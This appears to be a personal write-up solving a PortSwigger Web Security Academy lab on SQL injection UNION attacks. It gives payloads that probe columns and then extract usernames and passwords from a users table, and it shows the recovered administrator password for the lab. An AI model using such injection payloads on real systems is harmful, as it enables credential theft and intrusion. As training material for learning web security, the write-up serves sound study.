---
title: 'Lab: SQL injection UNION attack, retrieving data from other tables'
tags: [Portswigger Web Security Academy, Web]

category: "Security/Practice/Portswigger Web Security Academy/SQL"
---

# Lab: SQL injection UNION attack, retrieving data from other tables
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
* Hint:  The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

#### Exp
1. Using all technique we learned before
According to union-based technique we learned before, we can consider there're 2 columns in this database and both of them are text strings
Payload: `?category=Lifestyle' UNION SELECT 'Title name','Post content'--`
2. Find the detailed info in `users` table
Payload: `?category=Lifestyle' UNION SELECT username, password FROM users--`
3. Login as administrator
Username: `administrator`
Password: `5kg73b7jinl9plif82d3`
    :::spoiler Success Screenshot
    ![](https://i.imgur.com/kiRM6bX.png)
    :::

## Reference